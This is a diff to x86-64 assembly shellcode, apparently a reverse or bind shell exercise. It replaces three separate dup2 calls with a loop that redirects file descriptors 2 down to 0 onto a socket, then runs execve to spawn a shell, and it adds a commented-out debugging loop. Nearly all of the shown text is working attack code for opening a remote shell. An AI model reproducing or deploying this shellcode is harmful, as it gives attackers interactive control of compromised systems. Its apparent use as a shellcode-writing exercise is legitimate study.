@@ -33,23 +33,23 @@ mov dl, 16 ; addrlen
 mov rsi, rsp
 syscall
 
+
 ;dup2
+xor r12, r12 ;Initiate register to 0
+mov BYTE r12b, 0x2 ;Give the first value of stderr
+
 dup2:
 xor rax, rax
 xor rsi, rsi
 xor rdx, rdx
 
-mov al, 33
-mov sil, 0 
+mov al, 33 
+mov sil, r12b ;mov the newfd in the sil
 syscall
 
-mov al, 33
-mov sil, 1
-syscall
-
-mov al, 33
-mov sil, 2
-syscall
+dec r12b ;dec the fd
+cmp BYTE r12b, 0x0 ;compare
+jge dup2 ;jump if the fd is greater or equal to 0
 
 
 ;Time for Shell
@@ -69,6 +69,24 @@ mov al, 59
 mov rsi, rsp                ;Look to the pointer that points the string this is argv
 xor rdx, rdx                ;exit code
 syscall
+
+
+; mov cl, BYTE 0x3
+
+; testing:
+; xor rax, rax
+; push rcx
+
+; mov rax, 1
+; mov rdi, 1
+; mov rsi, rsp
+; mov rdx, 2
+; syscall
+
+; pop rcx
+; dec cl
+; cmp cl, BYTE 0x0
+; jge testing
 
 ;exit syscall
 xor rax, rax                
